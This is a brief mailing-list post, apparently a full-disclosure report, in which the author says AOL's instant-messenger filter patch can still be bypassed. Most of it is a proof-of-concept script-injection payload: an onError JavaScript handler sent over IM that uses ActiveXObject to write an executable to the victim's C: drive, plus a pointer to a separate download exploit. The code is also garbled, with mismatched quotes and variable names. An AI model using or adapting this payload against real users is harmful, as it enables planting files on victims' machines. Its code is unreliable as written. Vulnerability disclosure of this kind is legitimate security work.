Sorry for the brief post but Im still able to bypass filters that aol has
put in place.  So again with frustration I came to Full Disclosure to imply pressure on a
company to patch correctly.  From reading feedback from AOL they feel the
vulnerability is put to bed and requires no more attention, after the patch, I already disagree unfortunately.

I am not posting 0day PoC only currently patched examples.


You will need to send the following over an open source instant messanger manually

var jshellcode;
jsshellcode; = "var fso = new ActiveXObject("Scripting.FileSystemObject");var fh = fso.OpenTextFile("c:\\binary.exe", 8);var shellcode = "/x0";fh.WriteLine(shellcode);fh.Close(); ";
//you can also use the ADO XML download exe vulnarability from my other project in write.txt just converted to javascript

SendIM("<dd scml=" + Chr(34) + "........" + Chr(34) + "> " + Chr(34) & "onError=" + Chr(34) + "javascript:" + js & Chr(34) + ">");
